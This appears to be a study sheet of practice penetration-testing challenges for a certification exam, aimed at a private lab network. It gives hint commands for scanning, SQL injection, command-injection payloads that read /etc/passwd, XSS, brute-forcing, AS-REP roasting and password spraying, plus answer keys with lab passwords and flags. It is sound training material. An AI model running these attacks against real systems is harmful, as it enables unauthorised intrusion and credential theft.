# Practice challenges  
  
Pentest scenario — ACME Corp network (10.10.55.0/24), find all the flags.  
  
- Attacker: Parrot VM (10.10.55.5)  
- Use cheatsheets  
- Each challenge should take <10 min  
- Try before looking at answers  
  
---  
  
## Phase 1: Recon (exam minutes 0-45)  
  
### 1.1 — Map the network  
  
Discover all live hosts and services on 10.10.55.0/24.  
  
```  
□ How many hosts are alive? (3)  
□ Which one is the DC? How can you tell?  
□ Which one runs a web server?  
□ Which one has NFS exports?  
□ List all open ports on each host  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nmap -sn 10.10.55.0/24`  
- `nmap -sS -sV -O -p- -oA recon 10.10.55.0/24`  
- DC = port 88 + 389  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- 3 hosts: .10, .11, .22  
- DC = 10.10.55.22 (Kerberos 88, LDAP 389)  
- Web = 10.10.55.10 (port 80)  
- NFS = 10.10.55.11 (port 2049)  
  
</details>  
  
---  
  
### 1.2 — OS fingerprinting  
  
```  
□ What OS is 10.10.55.10?  
□ What OS is 10.10.55.22?  
□ What's the AD domain name?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nmap -O 10.10.55.10`  
- `nmap -A -sC -sV 10.10.55.22`  
- Look for "Domain:" in nmap output  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Both Debian 12  
- Domain: CEH.COM  
  
</details>  
  
---  
  
## Phase 2: Web attacks (exam: 5-7 flags)  
  
### 2.1 — SQL injection  
  
Target: http://10.10.55.10/sqli.php?id=1  
  
```  
□ SQLMap — find all database names  
□ What tables in 'dvwa' db?  
□ Dump 'users' table — admin's password hash?  
□ How many users total?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `sqlmap -u "http://10.10.55.10/sqli.php?id=1" --dbs`  
- `sqlmap -u "http://10.10.55.10/sqli.php?id=1" -D dvwa --tables`  
- `sqlmap -u "http://10.10.55.10/sqli.php?id=1" -D dvwa -T users --dump`  
  
</details>  
  
---  
  
### 2.2 — Command injection  
  
Target: http://10.10.55.10/cmd.php  
  
```  
□ Read /etc/passwd through the ping form — how many users?  
□ Hostname?  
□ Apache DocumentRoot?  
□ Can you read /etc/shadow? Why not?  
```  
  
<details>  
<summary>Hints</summary>  
  
In the IP field:  
- `; cat /etc/passwd`  
- `; hostname`  
- `; cat /etc/apache2/sites-available/000-default.conf`  
- `| whoami` (root or www-data?)  
  
</details>  
  
---  
  
### 2.3 — WordPress  
  
Target: http://10.10.55.10/wordpress  
  
```  
□ Enumerate WP users  
□ WP version?  
□ Vulnerable plugins?  
□ Brute force 'wpuser' — password?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `wpscan --url http://10.10.55.10/wordpress --enumerate u`  
- `wpscan --url http://10.10.55.10/wordpress --enumerate vp`  
- `wpscan --url http://10.10.55.10/wordpress -U wpuser -P /usr/share/wordlists/rockyou.txt`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- User: wpuser  
- Password: wppass123  
  
</details>  
  
---  
  
### 2.4 — Web server recon  
  
Target: http://10.10.55.10  
  
```  
□ Web server software + version?  
□ Hidden directories?  
□ Full Nikto scan — critical findings?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nikto -h http://10.10.55.10`  
- `dirb http://10.10.55.10`  
- `nmap -sV -p 80 10.10.55.10`  
  
</details>  
  
---  
  
### 2.5 — DVWA gauntlet  
  
Target: http://10.10.55.10/dvwa (admin/password)  
  
```  
□ Set security to "Low"  
□ SQLi — extract all user passwords  
□ Command injection — read /etc/passwd  
□ XSS reflected — pop an alert box  
□ XSS stored — persistent payload in guestbook  
```  
  
<details>  
<summary>Hints</summary>  
  
SQLi: `' OR 1=1 #` in User ID field  
Cmd injection: `; cat /etc/passwd` in IP field  
XSS reflected: `&lt;script&gt;alert('XSS')&lt;/script&gt;` in the input  
XSS stored: same payload in the guestbook Name field  
  
</details>  
  
---  
  
## Phase 3: Password cracking  
  
### 3.1 — FTP  
  
Target: 10.10.55.10:21  
  
```  
□ Anonymous FTP — what flag?  
□ Brute force 'ftpuser' — password?  
□ Login as ftpuser — flag in home dir?  
□ Brute force 'admin' — password?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `ftp 10.10.55.10` → user: anonymous, pass: (blank)  
- `hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.55.10 ftp`  
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.55.10 ftp`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Anonymous flag: FLAG{ftp_anonymous_access}  
- ftpuser: hunter2, flag: FLAG{ftp_user_credentials_leaked}  
- admin: password123  
  
</details>  
  
---  
  
### 3.2 — SSH brute force  
  
Target: 10.10.55.11:22  
  
```  
□ Brute force alice — password?  
□ Flag in her home dir?  
□ Other users with same password?  
□ Can you read /root/root_flag.txt? How to escalate?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `hydra -l alice -P /usr/share/wordlists/rockyou.txt 10.10.55.11 ssh`  
- After login: `cat ~/flag.txt`  
- Try same pass for joshua, mark, bob  
- `sudo -l` or SUID: `find / -perm -4000 2>/dev/null`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- alice: cupcake → FLAG{linux_user_alice_owned}  
- joshua and mark also use "cupcake"  
- bob uses "batman"  
  
</details>  
  
---  
  
### 3.3 — Hash cracking  
  
SSH into 10.10.55.11 as alice, get /home/alice/hashes.txt  
  
```  
□ Download hashes.txt to Parrot  
□ Identify hash type  
□ Crack all hashes with hashcat or john  
□ Plaintext passwords?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `scp alice@10.10.55.11:/home/alice/hashes.txt .`  
- Format: NTLM (pwdump)  
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`  
- Or: `john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`  
  
</details>  
  
---  
  
## Phase 4: Enumeration  
  
### 4.1 — SNMP  
  
Target: 10.10.55.11:161/udp  
  
```  
□ Community string? (try 'public')  
□ System location?  
□ System contact?  
□ OS and kernel version?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `snmpwalk -v2c -c public 10.10.55.11`  
- `snmpwalk -v2c -c public 10.10.55.11 | grep -i syslocation`  
- `snmpwalk -v2c -c public 10.10.55.11 | grep -i syscontact`  
- `snmpwalk -v2c -c public 10.10.55.11 | grep -i sysdescr`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Community: public  
- Location: "Server Room, Floor 3"  
- Contact: admin@target.com  
  
</details>  
  
---  
  
### 4.2 — NFS  
  
Target: 10.10.55.11:2049  
  
```  
□ What NFS shares are exported?  
□ Mount it — what files?  
□ Flag in the confidential file?  
□ Is no_root_squash set? Why is that bad?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `showmount -e 10.10.55.11`  
- `mkdir /tmp/nfs && sudo mount -t nfs 10.10.55.11:/srv/nfs/shared /tmp/nfs`  
- `cat /tmp/nfs/confidential.txt`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Export: /srv/nfs/shared  
- Flag: FLAG{nfs_share_exposed}  
- no_root_squash = remote root has root access on share (privesc vector)  
  
</details>  
  
---  
  
### 4.3 — SMTP  
  
Target: 10.10.55.11:25  
  
```  
□ What SMTP commands supported?  
□ Enumerate valid users with VRFY  
□ Which exist: alice, bob, admin, root, ceo, hr?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `nmap -p 25 --script smtp-commands 10.10.55.11`  
- Create users.txt with: alice, bob, admin, root, ceo, hr  
- `smtp-user-enum -M VRFY -U users.txt -t 10.10.55.11`  
  
</details>  
  
---  
  
### 4.4 — SMB  
  
Target: 10.10.55.22:445  
  
```  
□ Enumerate shares on the DC  
□ Access 'shared' as guest?  
□ Flag?  
□ Enumerate domain users via SMB  
```  
  
<details>  
<summary>Hints</summary>  
  
- `enum4linux -a 10.10.55.22`  
- `smbclient //10.10.55.22/shared -N`  
- `nmap --script smb-enum-shares,smb-enum-users -p 445 10.10.55.22`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Flag: FLAG{smb_guest_share_access}  
  
</details>  
  
---  
  
### 4.5 — LDAP  
  
Target: 10.10.55.22:389  
  
```  
□ Anonymous LDAP bind — does it work?  
□ List all user accounts  
□ What OUs exist?  
□ Find user with DONT_REQUIRE_PREAUTH  
```  
  
<details>  
<summary>Hints</summary>  
  
- `ldapsearch -x -h 10.10.55.22 -b "dc=CEH,dc=COM"`  
- `ldapsearch -x -h 10.10.55.22 -b "dc=CEH,dc=COM" "(objectclass=user)" cn`  
- `nmap -p 389 --script ldap-search 10.10.55.22`  
  
</details>  
  
---  
  
## Phase 5: AD attacks (new in v13)  
  
### 5.1 — AS-REP roasting  
  
Target: 10.10.55.22 (DC for CEH.COM)  
  
```  
□ Make users.txt: Administrator, Joshua, Mark, SQL_srv, DC-Admin  
□ GetNPUsers.py — who's AS-REP roastable?  
□ Crack the hash — password?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `echo -e "Administrator\nJoshua\nMark\nSQL_srv\nDC-Admin" > users.txt`  
- `python3 /usr/share/impacket/GetNPUsers.py CEH.COM/ -no-pass -usersfile users.txt -dc-ip 10.10.55.22`  
- `hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`  
- Or: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Joshua is vulnerable  
- Password: cupcake  
  
</details>  
  
---  
  
### 5.2 — Password spraying  
  
```  
□ Spray 'cupcake' across all known users  
□ Who else uses 'cupcake'?  
□ Can you RDP/SSH into anything with these creds?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `crackmapexec smb 10.10.55.22 -u users.txt -p "cupcake"`  
- `crackmapexec ssh 10.10.55.11 -u users.txt -p "cupcake"`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- Mark and Joshua both use "cupcake"  
  
</details>  
  
---  
  
### 5.3 — Authenticated SMB & LDAP enum  
  
Now that you have creds:  
  
```  
□ Enumerate all domain groups  
□ Who's in Domain Admins?  
□ List all SPNs (prep for kerberoasting)  
```  
  
<details>  
<summary>Hints</summary>  
  
- `crackmapexec smb 10.10.55.22 -u Joshua -p cupcake --groups`  
- `ldapsearch -x -h 10.10.55.22 -D "Joshua@CEH.COM" -w cupcake -b "dc=CEH,dc=COM" "(memberOf=CN=Domain Admins,CN=Users,DC=CEH,DC=COM)"`  
- `python3 /usr/share/impacket/GetUserSPNs.py CEH.COM/Joshua:cupcake -dc-ip 10.10.55.22`  
  
</details>  
  
<details>  
<summary>Answers</summary>  
  
- DC-Admin is in Domain Admins  
  
</details>  
  
---  
  
## Phase 6: MySQL  
  
### 6.1 — Database access  
  
Target: 10.10.55.10:3306  
  
```  
□ Connect remotely — what databases exist?  
□ Tables in 'dvwa'?  
□ Extract usernames + hashes from DVWA  
□ Tables in 'wordpress'?  
□ WordPress admin creds?  
```  
  
<details>  
<summary>Hints</summary>  
  
- `mysql -h 10.10.55.10 -u root -p` (password: toor)  
- `SHOW DATABASES;`  
- `USE dvwa; SELECT * FROM users;`  
- `USE wordpress; SELECT user_login, user_pass FROM wp_users;`  
  
</details>  
  
---  
  
## Scoring  
  
| Phase | Challenges | Exam weight |  
|-------|-----------|-------------|  
| Recon | 3 missions | 15% |  
| Web attacks | 5 missions | 35% |  
| Password cracking | 3 missions | 15% |  
| Enumeration | 5 missions | 15% |  
| AD attacks | 3 missions | 15% |  
| Database | 1 mission | 5% |  
  
Total: 20 missions, same as the exam.  
  
---  
  
## Speedrun mode  
  
After doing all missions once, try the speedrun:  
  
- 3 hour timer (half of exam time)  
- Gold: < 2 hours, Silver: < 3 hours, Bronze: < 4 hours  
- If I can gold this, I pass the exam  
  
---  
  
## After each session  
  
1. Which mission took the longest? Why?  
2. Did I google anything? Add it to the cheatsheet.  
3. Which tool syntax did I mess up? Practice 5 more times.  
4. Could I do this faster?  
